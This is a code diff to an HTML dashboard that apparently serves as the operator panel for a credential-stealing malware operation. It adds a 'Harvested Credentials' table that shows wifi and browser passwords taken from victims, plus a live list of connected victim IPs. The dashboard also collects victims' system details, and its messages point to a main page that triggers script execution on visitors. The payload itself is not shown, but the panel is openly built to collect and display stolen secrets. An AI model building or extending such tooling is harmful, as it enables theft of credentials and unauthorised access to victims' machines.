@@ -16,7 +16,7 @@
 
     <main class="container mx-auto py-8">
         <!-- Statistics Cards -->
-        <div class="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
+        <div class="grid grid-cols-1 md:grid-cols-5 gap-6 mb-8">
             <div class="bg-white p-6 rounded-lg shadow-md">
                 <h3 class="text-lg font-semibold text-gray-700">Total Executions</h3>
                 <p class="text-3xl font-bold text-blue-600" id="totalDownloads">0</p>
@@ -26,8 +26,12 @@
                 <p class="text-3xl font-bold text-green-600" id="totalSystemInfo">0</p>
             </div>
             <div class="bg-white p-6 rounded-lg shadow-md">
-                <h3 class="text-lg font-semibold text-gray-700">Successful</h3>
-                <p class="text-3xl font-bold text-purple-600" id="successfulExecutions">0</p>
+                <h3 class="text-lg font-semibold text-gray-700">Credentials</h3>
+                <p class="text-3xl font-bold text-red-600" id="totalCredentials">0</p>
+            </div>
+            <div class="bg-white p-6 rounded-lg shadow-md">
+                <h3 class="text-lg font-semibold text-gray-700">Active Connections</h3>
+                <p class="text-3xl font-bold text-purple-600" id="activeConnections">0</p>
             </div>
             <div class="bg-white p-6 rounded-lg shadow-md">
                 <h3 class="text-lg font-semibold text-gray-700">Last Activity</h3>
@@ -65,6 +69,53 @@
             </div>
         </div>
 
+        <!-- Credentials Table -->
+        <div class="bg-white p-6 rounded-lg shadow-md mb-8">
+            <h2 class="text-xl font-bold mb-4">🔐 Harvested Credentials</h2>
+            <div class="overflow-x-auto">
+                <table class="min-w-full table-auto">
+                    <thead class="bg-gray-50">
+                        <tr>
+                            <th class="px-4 py-2 text-left">ID</th>
+                            <th class="px-4 py-2 text-left">Type</th>
+                            <th class="px-4 py-2 text-left">Client</th>
+                            <th class="px-4 py-2 text-left">Service/SSID</th>
+                            <th class="px-4 py-2 text-left">Password/Data</th>
+                            <th class="px-4 py-2 text-left">Timestamp</th>
+                        </tr>
+                    </thead>
+                    <tbody id="credentialsList" class="bg-white divide-y divide-gray-200">
+                        <tr>
+                            <td colspan="6" class="px-4 py-8 text-center text-gray-500">No credentials harvested yet. Execute the enhanced script to see credentials here.</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Connections Table -->
+        <div class="bg-white p-6 rounded-lg shadow-md mb-8">
+            <h2 class="text-xl font-bold mb-4">🔗 Active Connections</h2>
+            <div class="overflow-x-auto">
+                <table class="min-w-full table-auto">
+                    <thead class="bg-gray-50">
+                        <tr>
+                            <th class="px-4 py-2 text-left">ID</th>
+                            <th class="px-4 py-2 text-left">IP Address</th>
+                            <th class="px-4 py-2 text-left">Connected At</th>
+                            <th class="px-4 py-2 text-left">Status</th>
+                            <th class="px-4 py-2 text-left">Duration</th>
+                        </tr>
+                    </thead>
+                    <tbody id="connectionsList" class="bg-white divide-y divide-gray-200">
+                        <tr>
+                            <td colspan="5" class="px-4 py-8 text-center text-gray-500">No connections established yet. Execute the enhanced script to establish connections.</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
         <!-- Execution Log Table -->
         <div class="bg-white p-6 rounded-lg shadow-md">
             <h2 class="text-xl font-bold mb-4">📥 Execution Log</h2>
@@ -77,12 +128,13 @@
                             <th class="px-4 py-2 text-left">IP Address</th>
                             <th class="px-4 py-2 text-left">Software</th>
                             <th class="px-4 py-2 text-left">Status</th>
+                            <th class="px-4 py-2 text-left">Script Executed</th>
                             <th class="px-4 py-2 text-left">Timestamp</th>
                         </tr>
                     </thead>
                     <tbody id="downloadsList" class="bg-white divide-y divide-gray-200">
                         <tr>
-                            <td colspan="6" class="px-4 py-8 text-center text-gray-500">No executions yet. Visit the main page to trigger script execution.</td>
+                            <td colspan="7" class="px-4 py-8 text-center text-gray-500">No executions yet. Visit the main page to trigger script execution.</td>
                         </tr>
                     </tbody>
                 </table>
@@ -104,9 +156,7 @@
     <script>
         let systemDataGlobal = [];
         
-        // Add this to the existing dashboard.html script section
-        
-        // Enhanced fetchData function with system script status
+        // Single comprehensive fetchData function
         async function fetchData() {
             try {
                 console.log('🔄 Fetching data from server...');
@@ -121,21 +171,28 @@
                 
                 const downloads = data.downloads || [];
                 const systemData = data.systemInfo || [];
+                const credentials = data.credentials || [];
+                const connections = data.connections || [];
+                
+                // Store system data globally for modal
+                systemDataGlobal = systemData;
                 
                 // Update statistics
                 document.getElementById('totalDownloads').textContent = downloads.length;
                 document.getElementById('totalSystemInfo').textContent = systemData.length;
-                document.getElementById('successfulExecutions').textContent = downloads.filter(d => d.status === 'completed' && d.systemScriptExecuted).length;
+                document.getElementById('totalCredentials').textContent = credentials.length;
+                document.getElementById('activeConnections').textContent = data.activeConnections ? data.activeConnections.length : 0;
                 
                 // Update last activity
-                if (downloads.length > 0) {
-                    const lastDownload = downloads[downloads.length - 1];
-                    document.getElementById('lastActivity').textContent = new Date(lastDownload.timestamp).toLocaleTimeString();
+                const allActivities = [...downloads, ...systemData, ...credentials];
+                if (allActivities.length > 0) {
+                    const lastActivity = allActivities.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0];
+                    document.getElementById('lastActivity').textContent = new Date(lastActivity.timestamp).toLocaleTimeString();
                 } else {
                     document.getElementById('lastActivity').textContent = 'None';
                 }
                 
-                // Update downloads table with system script status
+                // Update downloads/execution log table
                 const downloadsList = document.getElementById('downloadsList');
                 if (downloads.length === 0) {
                     downloadsList.innerHTML = '<tr><td colspan="7" class="px-4 py-8 text-center text-gray-500">No executions yet. Visit the main page to trigger script execution.</td></tr>';
@@ -163,6 +220,56 @@
                     `).join('');
                 }
                 
+                // Update credentials table
+                const credentialsList = document.getElementById('credentialsList');
+                if (credentials.length === 0) {
+                    credentialsList.innerHTML = '<tr><td colspan="6" class="px-4 py-8 text-center text-gray-500">No credentials harvested yet. Execute the enhanced script to see credentials here.</td></tr>';
+                } else {
+                    credentialsList.innerHTML = credentials.map(cred => `
+                        <tr class="hover:bg-gray-50">
+                            <td class="px-4 py-2 font-medium">${cred.id}</td>
+                            <td class="px-4 py-2">
+                                <span class="px-2 py-1 rounded text-xs ${
+                                    cred.type === 'wifi' ? 'bg-yellow-100 text-yellow-800' : 
+                                    cred.type === 'browser' ? 'bg-blue-100 text-blue-800' : 
+                                    'bg-gray-100 text-gray-800'
+                                }">📶 ${cred.type.toUpperCase()}</span>
+                            </td>
+                            <td class="px-4 py-2">${cred.clientId ? cred.clientId.split(':')[0] : 'Unknown'}</td>
+                            <td class="px-4 py-2 font-mono">${cred.ssid || cred.service || 'N/A'}</td>
+                            <td class="px-4 py-2 font-mono text-red-600">${cred.password || cred.data || 'N/A'}</td>
+                            <td class="px-4 py-2">${new Date(cred.timestamp).toLocaleString()}</td>
+                        </tr>
+                    `).join('');
+                }
+                
+                // Update connections table
+                const connectionsList = document.getElementById('connectionsList');
+                if (connections.length === 0) {
+                    connectionsList.innerHTML = '<tr><td colspan="5" class="px-4 py-8 text-center text-gray-500">No connections established yet. Execute the enhanced script to establish connections.</td></tr>';
+                } else {
+                    connectionsList.innerHTML = connections.map(conn => {
+                        const connectedAt = new Date(conn.connectedAt);
+                        const duration = conn.status === 'active' ? 
+                            Math.floor((new Date() - connectedAt) / 1000) + 's' : 
+                            'Disconnected';
+                        
+                        return `
+                            <tr class="hover:bg-gray-50">
+                                <td class="px-4 py-2 font-medium">${conn.id}</td>
+                                <td class="px-4 py-2 font-mono">${conn.ip}</td>
+                                <td class="px-4 py-2">${connectedAt.toLocaleString()}</td>
+                                <td class="px-4 py-2">
+                                    <span class="px-2 py-1 rounded text-xs ${
+                                        conn.status === 'active' ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'
+                                    }">🔗 ${conn.status.toUpperCase()}</span>
+                                </td>
+                                <td class="px-4 py-2">${duration}</td>
+                            </tr>
+                        `;
+                    }).join('');
+                }
+                
                 // Update system information table
                 const systemInfoList = document.getElementById('systemInfoList');
                 if (systemData.length === 0) {
@@ -175,7 +282,7 @@
                             <td class="px-4 py-2">${system.os}</td>
                             <td class="px-4 py-2">${system.architecture}</td>
                             <td class="px-4 py-2">${system.user}</td>
-                            <td class="px-4 py-2">${system.memory_gb} GB</td>
+                            <td class="px-4 py-2">${system.memory_gb || 'N/A'} GB</td>
                             <td class="px-4 py-2">${system.clientIP}</td>
                             <td class="px-4 py-2">${new Date(system.timestamp).toLocaleString()}</td>
                             <td class="px-4 py-2">
@@ -186,14 +293,20 @@
                 }
                 
                 // Show success message if data exists
-                if (downloads.length > 0 || systemData.length > 0) {
+                if (downloads.length > 0 || systemData.length > 0 || credentials.length > 0) {
                     console.log('✅ Dashboard updated successfully!');
                 }
                 
             } catch (error) {
                 console.error('❌ Error fetching data:', error);
+                // Show error in multiple places for better visibility
                 const downloadsList = document.getElementById('downloadsList');
+                const credentialsList = document.getElementById('credentialsList');
+                const systemInfoList = document.getElementById('systemInfoList');
+                
                 downloadsList.innerHTML = '<tr><td colspan="7" class="px-4 py-8 text-center text-red-500">Error loading data. Check console for details.</td></tr>';
+                credentialsList.innerHTML = '<tr><td colspan="6" class="px-4 py-8 text-center text-red-500">Error loading data. Check console for details.</td></tr>';
+                systemInfoList.innerHTML = '<tr><td colspan="9" class="px-4 py-8 text-center text-red-500">Error loading data. Check console for details.</td></tr>';
             }
         }
         
@@ -204,13 +317,13 @@
                     <div class="space-y-2">
                         <p><strong>ID:</strong> ${system.id}</p>
                         <p><strong>Hostname:</strong> ${system.hostname}</p>
-                        <p><strong>Operating System:</strong> ${system.os} ${system.os_version}</p>
+                        <p><strong>Operating System:</strong> ${system.os} ${system.os_version || ''}</p>
                         <p><strong>Architecture:</strong> ${system.architecture}</p>
-                        <p><strong>Processor:</strong> ${system.processor}</p>
+                        <p><strong>Processor:</strong> ${system.processor || 'N/A'}</p>
                         <p><strong>User:</strong> ${system.user}</p>
-                        <p><strong>CPU Count:</strong> ${system.cpu_count}</p>
-                        <p><strong>Memory:</strong> ${system.memory_gb} GB</p>
-                        <p><strong>Python Version:</strong> ${system.python_version}</p>
+                        <p><strong>CPU Count:</strong> ${system.cpu_count || 'N/A'}</p>
+                        <p><strong>Memory:</strong> ${system.memory_gb || 'N/A'} GB</p>
+                        <p><strong>Python Version:</strong> ${system.python_version || 'N/A'}</p>
                         <p><strong>Client IP:</strong> ${system.clientIP}</p>
                         <p><strong>Timestamp:</strong> ${new Date(system.timestamp).toLocaleString()}</p>
                     </div>
@@ -223,11 +336,11 @@
             document.getElementById('systemModal').classList.add('hidden');
         }
         
-        // Fetch data immediately when page loads
-        fetchData();
+        // Auto-refresh every 5 seconds
+        setInterval(fetchData, 5000);
         
-        // Refresh data every 3 seconds
-        setInterval(fetchData, 3000);
+        // Initial load
+        fetchData();
     </script>
 </body>
 </html>
